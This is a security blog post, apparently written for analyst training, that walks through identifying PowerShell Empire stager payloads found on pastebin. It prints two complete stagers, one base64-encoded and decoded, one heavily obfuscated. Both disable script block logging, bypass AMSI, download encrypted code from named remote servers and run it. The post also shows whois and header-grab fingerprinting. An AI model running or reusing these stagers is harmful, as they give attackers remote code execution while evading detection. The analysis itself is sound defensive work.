---
layout: post
title:  "Powershell that looks & smells like Empire Payloads"
date:   2018-01-11 13:49:33 +0000
tags: [malware, powershell, empire, pentest, redteam, blueteam]
---
![](/blog/assets/empire.png)

Today we found the following powershell Proof of Concept (PoC) on pastebin.com, we immediately recognised this as an Empire payload. The junior analysts in the team where shocked that we could quickly call this out. So we showed them some key points to consider, that allows you to quickly analyse these kinds of PoC’s within 30 seconds.

# The sample
https://pastebin.com/raw/tTMzK8YG
<pre>
powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBJAG8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBlAEYAXQAuAEEAUwBTAEUAbQBiAGwAeQAuAEcAZQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAEkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAHQAVgBBAEwAdQBFACgAJABuAHUATABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAFMAZQB7AFsAUwBjAFIAaQBQAHQAQgBsAG8AYwBrAF0ALgAiAEcARQB0AEYASQBlAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AEUAKAAkAE4AVQBsAGwALAAoAE4ARQBXAC0ATwBCAEoARQBjAHQAIABDAG8AbABMAGUAQwB0AGkAbwBuAFMALgBHAEUATgBFAFIASQBjAC4ASABhAFMASABTAEUAVABbAHMAdAByAEkAbgBnAF0AKQApAH0AWwBSAEUARgBdAC4AQQBzAFMAZQBtAGIAbABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAHUARQApAH0AOwB9ADsAWwBTAFkAUwB0AEUAbQAuAE4AZQB0AC4AUwBlAFIAVgBJAGMARQBQAG8ASQBOAFQATQBhAG4AYQBHAEUAcgBdADoAOgBFAFgAUABFAEMAVAAxADAAMABDAE8AbgB0AGkAbgBVAGUAPQAwADsAJAB3AGMAPQBOAEUAVwAtAE8AQgBqAEUAQwB0ACAAUwB5AHMAVABFAG0ALgBOAGUAdAAuAFcAZQBiAEMATABJAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABFAGEARABFAHIAcwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAE8AeABZAD0AWwBTAFkAUwB0AGUAbQAuAE4ARQB0AC4AVwBFAGIAUgBFAHEAdQBlAHMAdABdADoAOgBEAEUAZgBhAFUAbAB0AFcAZQBiAFAAcgBvAHgAWQA7ACQAdwBjAC4AUAByAG8AWABZAC4AQwBSAEUARABlAG4AVABJAEEATABTACAAPQAgAFsAUwBZAFMAdABFAG0ALgBOAEUAVAAuAEMAcgBlAEQARQBOAHQAaQBBAGwAQwBhAGMASABFAF0AOgA6AEQARQBmAGEAdQBMAFQATgBFAFQAdwBPAHIAawBDAHIARQBkAGUATgBUAGkAYQBsAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAUwBUAGUAbQAuAFQAZQBYAFQALgBFAG4AQwBvAEQAaQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAFQAZQBTACgAJwA2ADcANwAzADMANgA0ADgANwAzADEAMwBjAGEANQA2AGMAMgA1ADMANAA1AGQAZgBiAGIANgA0ADUAMAA0ADEAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADYANQAuADIAMgA3AC4AMQA1ADcALgAxADYAOAA6ADgAMQAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAdwBDAC4ASABFAEEARABlAFIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ASQB1AFEAZABWAFAAeABYADUAbwBlAC8AUgB2AEMAOQBEADUAbgBaAGgAVQBkAEUASQBNAE0APQAiACkAOwAkAEQAQQB0AEEAPQAkAFcAQwAuAEQAbwBXAE4ATABPAEEARABEAGEAdABhACgAJABTAGUAUgArACQAVAApADsAJABpAFYAPQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAYQBUAGEAPQAkAGQAYQB0AEEAWwA0AC4ALgAkAGQAYQBUAGEALgBMAEUATgBHAHQASABdADsALQBqAG8ASQBuAFsAQwBoAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
</pre>
You can either use either or the following commands to decode base64 strings:

Windows: 
<code>
certutil /decode [base64 infile] [base64 outfile]
</code>

Linux: 
<code>
base64 -d [base64 infile]
</code>
or you can choose to use an online platform such as http://gchq.github.io/CyberChef/

**Sidenote**: When downloading this base64 sample onto our Windows 10 sandbox Windows Defender immediately identifies as PowerMeterpreter

# Base64 decoded Sample
<pre>
<code>IF($PSVeRSIoNTablE.PSVeRsiON.MaJOr -Ge 3){$GPS=[ReF].ASSEmbly.GetTYpE(‘System.Management.Automation.Utils’).”GetFIe`LD”(‘cachedGroupPolicySettings’,’N’+’onPublic,Static’).GEtVALuE($nuLl);If($GPS[‘ScriptB’+’lockLogging’]){$GPS[‘ScriptB’+’lockLogging’][‘EnableScriptB’+’lockLogging’]=0;$GPS[‘ScriptB’+’lockLogging’][‘EnableScriptBlockInvocationLogging’]=0}ELSe{[ScRiPtBlock].”GEtFIe`ld”(‘signatures’,’N’+’onPublic,Static’).SetValuE($NUll,(NEW-OBJEct ColLeCtionS.GENERIc.HaSHSET[strIng]))}[REF].AsSemblY.GeTTYpe(‘System.Management.Automation.AmsiUtils’)|?{$_}|%{$_.GetFIelD(‘amsiInitFailed’,’NonPublic,Static’).SeTValUE($nUlL,$TRuE)};};[SYStEm.Net.SeRVIcEPoINTManaGEr]::EXPECT100COntinUe=0;$wc=NEW-OBjECt SysTEm.Net.WebCLIENT;$u=’Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko’;$WC.HEaDErs.ADD(‘User-Agent’,$u);$WC.PrOxY=[SYStem.NEt.WEbREquest]::DEfaUltWebProxY;$wc.ProXY.CREDenTIALS = [SYStEm.NET.CreDENtiAlCacHE]::DEfauLTNETwOrkCrEdeNTialS;$Script:Proxy = $wc.Proxy;$K=[SYSTem.TeXT.EnCoDiNg]::ASCII.GETBYTeS(‘677336487313ca56c25345dfbb645041’);$R={$D,$K=$ARgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CouNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};$ser=’http://165.227.157.168:81';$t='/admin/get.php';$wC.HEADeRs.Add("Cookie","session=IuQdVPxX5oe/RvC9D5nZhUdEIMM=");$DAtA=$WC.DoWNLOADData($SeR+$T);$iV=$DatA[0..3];$daTa=$datA[4..$daTa.LENGtH];-joIn[ChAr[]](& $R $DaTa ($IV+$K))|IEX
</code>
</pre>
Looks like Empire smells like Empire because…

The following pages are very common for Empire listeners:
* /admin/get.php
* /admin/news.php
* /login/process.php

http://165.227.157.168:81/admin/get.php

Simple whois query reveals the hosting provider is Digital Ocean, a favourite cloud hosting provider for penetration testers and red-teamers:
<pre>
$whois 165.227.157.168
NetRange: 165.227.0.0–165.227.255.255 
CIDR: 165.227.0.0/16
NetName: DIGITALOCEAN-19
NetHandle: NET-165–227–0–0–1
NetType: Direct Allocation
Organization: DigitalOcean, LLC (DO-13)
</pre>
Grabbing the HTTP headers also reveals an important piece of information as Empire’s Server Header defaults to IIS/7.5, and expiry header equals 0. See below:
<pre>
$whois 165.227.157.168
$ nc 165.227.157.168 81
HEAD / HTTP/1.0
200 OK
Content-Type: text/html
Content-Length: 233
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Server: Microsoft-IIS/7.5
</pre>
# Conclusion
That is how we were able to determine so quickly that this PoC is an Empire payload; What helped us in the past is experience with the Empire framework, testing and researching modules against our own systems. An important factor in this example is that the attackers/red-teamers did very little to obfuscate or change the default settings! Making our analysis an easy effort.

* PowershellEmpire Logo is from https://www.powershellempire.com/

# Update 2018–01–15: Obfuscate to the Max!!!
Spotted a slightly more obscure sample on pastebin https://pastebin.com/jB4jJFHe
<pre>
start /b CMd /c “SEt Vdl= ^&(“{0}{1}{2}” -f’Se’,’T-iTE’,’m’) (“vaR”+”Ia”+”BLE:1kzW”) ([TYpe](“{2}{0}{1}” -F ‘PtblOC’,’K’,’SCRi’)) ;.(“{2}{1}{0}”-f’eM’,’T-It’,’se’) (“vAr”+”IaB”+”LE:”+”P”+”3Qk”) ( [TYPe](“{1}{0}” -f’eF’,’R’) ) ; .(“{2}{0}{1}”-f ‘T’,’-ITem’,’sE’) (“vaRiA”+”BL”+”E:K”+”zGw”) ( [TyPe](“{1}{3}{2}{6}{5}{0}{4}{7}” -f ‘pOinTMaN’,’sYS’,’nE’,’TEm.’,’aG’,’.sErViCE’,’T’,’ER’) ) ; $9bX =[tYPE](“{2}{1}{4}{3}{0}” -F ‘BRequesT’,’YstE’,’s’,’net.we’,’m.’) ; .(“{1}{0}”-f ‘eT’,’S’) NujPlG ( [tYpe](“{1}{6}{4}{2}{0}{3}{5}” -f’CreDE’,’SYStE’,’et.’,’NTi’,’.n’,’aLCACHe’,’m’) ) ; $37B9 =[tyPE](“{0}{3}{1}{2}”-F ‘SySTE’,’tEXt.ENc’,’ODING’,’M.’) ;IF(${PsVeRs`iONt`ABLe}.”PsVeR`SI`oN”.”M`AjOr” -gE 3){${G`Ps}= ( .(“{2}{1}{0}” -f ‘TEm’,’I’,’get-’) (‘vARI’+’AB’+’Le:P3qk’) ).ValUE.”a`S`sEMBlY”.(“{0}{2}{1}” -f’GE’,’PE’,’tTY’).Invoke((“{4}{8}{1}{7}{5}{0}{2}{3}{6}” -f ‘Automation.’,’an’,’Uti’,’l’,’Syste’,’nt.’,’s’,’ageme’,’m.M’)).”GEtFiE`lD”((“{0}{7}{3}{1}{4}{6}{2}{5}”-f ‘c’,’p’,’g’,’dGrou’,’Policy’,’s’,’Settin’,’ache’),’N’+(“{3}{1}{0}{2}”-f’ic,’,’nPubl’,’Static’,’o’)).(“{2}{1}{0}”-f ‘E’,’eTValU’,’G’).Invoke(${Nu`LL});IF(${g`Ps}[(“{0}{2}{1}” -f ‘Sc’,’tB’,’rip’)+(“{1}{3}{2}{0}” -f’g’,’lockL’,’ggin’,’o’)]){${G`PS}[(“{1}{0}” -f ‘ptB’,’Scri’)+(“{2}{1}{0}” -f ‘ng’,’Loggi’,’lock’)][(“{3}{2}{1}{0}”-f’B’,’Script’,’le’,’Enab’)+(“{1}{0}{2}”-f ‘ckLoggin’,’lo’,’g’)]=0;${G`ps}[(“{0}{1}{2}”-f ‘S’,’crip’,’tB’)+(“{0}{3}{1}{2}”-f ‘l’,’ckLoggin’,’g’,’o’)][(“{5}{1}{3}{4}{2}{0}” -f ‘g’,’n’,’ggin’,’ableScriptBl’,’ockInvocationLo’,’E’)]=0}ElsE{ ( .(“{2}{0}{1}” -f ‘-i’,’Tem’,’geT’) (“VaR”+”Ia”+”bLe:1kzW”) ).vaLuE.”GetFIE`lD”((“{2}{1}{0}”-f ‘es’,’r’,’signatu’),’N’+(“{0}{3}{2}{1}”-f’on’,’ic,Static’,’bl’,’Pu’)).”sE`TvAlue”(${Nu`lL},(.(“{1}{0}{2}” -f’eW’,’N’,’-Object’) (“{6}{8}{7}{0}{1}{3}{9}{5}{4}{2}” -f ‘cTi’,’oNS.GeNE’,’]’,’R’,’hSet[StRIng’,’S’,’CO’,’e’,’LL’,’ic.HA’)))} $P3QK.”A`SsE`MBlY”.(“{0}{1}{2}” -f ‘Ge’,’T’,’TyPe’).Invoke((“{6}{9}{5}{7}{10}{4}{3}{1}{8}{0}{2}” -f ‘ms’,’i’,’iUtils’,’mat’,’.Auto’,’st’,’S’,’em.Manageme’,’on.A’,’y’,’nt’))^|.(‘?’){${_}}^|.(‘%’){${_}.(“{0}{2}{1}” -f’G’,’FIELD’,’et’).Invoke((“{0}{2}{1}” -f ‘a’,’nitFailed’,’msiI’),(“{2}{0}{1}{3}”-f’c,S’,’tat’,’NonPubli’,’ic’)).(“{0}{1}”-f’SeTV’,’ALUE’).Invoke(${N`ULl},${T`RUe})};}; $kZgW::”E`x`pEct100cO`N`TInUE”=0;${wc}=^&(“{0}{1}{2}” -f ‘NE’,’W’,’-ObJECt’) (“{1}{0}{3}{4}{2}”-f’yst’,’S’,’t’,’Em.NET.WebCLIe’,’n’);${U}=(“{12}{6}{8}{2}{14}{1}{7}{10}{15}{0}{9}{5}{4}{16}{3}{11}{13}”-f ‘1; WOW64; Trident/’,’i’,’la’,’ G’,’ rv’,’.0;’,’z’,’n’,’il’,’7',’dows NT ‘,’e’,’Mo’,’cko’,’/5.0 (W’,’6.’,’:11.0) like’);${wc}.”HEa`De`Rs”.(“{0}{1}” -f’Ad’,’D’).Invoke((“{1}{2}{0}{3}” -f ‘en’,’User’,’-Ag’,’t’),${u});${wc}.”pro`XY”= ( ^&(“{1}{0}” -f ‘Et-ItEm’,’g’) VaRiabLe:9Bx).vaLUe::”D`E`FaUltWebPR`o`XY”;${wc}.”P`ROxy”.”Credent`i`ALs” = (.(“{3}{2}{1}{0}” -f’tEM’,’ildI’,’T-Ch’,’GE’) VARiABLE:nujPlG ).valUE::”De`FA`UlT`NETwoRkC`RE`deNt`IALS”;${SCrIp`T`:p`RoXy} = ${W`c}.”p`ROXy”;${k}= ( ^&(“{2}{0}{1}” -f ‘-VARIa’,’blE’,’GET’) (‘3’+’7b9') -VALueonly )::”As`CII”.(“{2}{0}{1}” -f’eT’,’BYtEs’,’G’).Invoke(‘SFE)[Uf#GWB^<]{m=/thRxp;46YHbavn~’);${R}={${d},${K}=${ar`GS};${s}=0..255;0..255^|.(‘%’){${J}=(${j}+${S}[${_}]+${k}[${_}%${K}.”C`OUNt”])%256;${S}[${_}],${s}[${J}]=${s}[${J}],${S}[${_}]};${D}^|.(‘%’){${i}=(${I}+1)%256;${H}=(${H}+${S}[${I}])%256;${S}[${i}],${S}[${h}]=${s}[${h}],${s}[${I}];${_}-BXOR${S}[(${s}[${i}]+${S}[${H}])%256]}};${s`er}=(“{5}{3}{2}{4}{6}{1}{0}” -f’4445',’.59.85:’,’/1',’:/’,’94.6',’http’,’8');${t}=(“{2}{1}{3}{0}{4}{5}” -f ‘c’,’login’,’/’,’/pro’,’ess.ph’,’p’);${Wc}.”h`e`ADERS”.(“{1}{0}” -f’DD’,’A’).Invoke((“{2}{0}{1}” -f ‘o’,’okie’,’C’),(“{4}{8}{0}{5}{7}{2}{6}{3}{9}{1}” -f’=Q76eu’,’RirqkGw=’,’v’,’E’,’sessi’,’tS’,’2nZ5',’DW’,’on’,’m8DJE’));${da`TA}=${WC}.(“{0}{1}{2}”-f’DoWnlO’,’adDa’,’TA’).Invoke(${S`eR}+${t});${Iv}=${Da`TA}[0..3];${D`ATa}=${d`Ata}[4..${D`Ata}.”leN`GTh”];-jOIn[ChAR[]](^& ${r} ${da`TA} (${I`V}+${K}))^|.(“{1}{0}”-f’EX’,’I’)&& sEt avx=eCho iNvOKE-EXpreSsioN (ITEM env:vDl).VaLue ^| POweRSHElL -NOPROFiLE -NOe -NOninTErAc -wiNd hIdDEn -execu BYpASS -&& CMd /c%avX%”
start /b “” cmd /c del “%~f0”&exit /b
</pre>
To decode this sample the numbers in brackets tell you the order of the following string. Eg.
<pre>
“{5}{3}{2}{4}{6}{1}{0}” -f’4445',’.59.85:’,’/1',’:/’,’94.6',’http’,’8'
</pre>
Becomes:
* http://194.68.59.85:4445
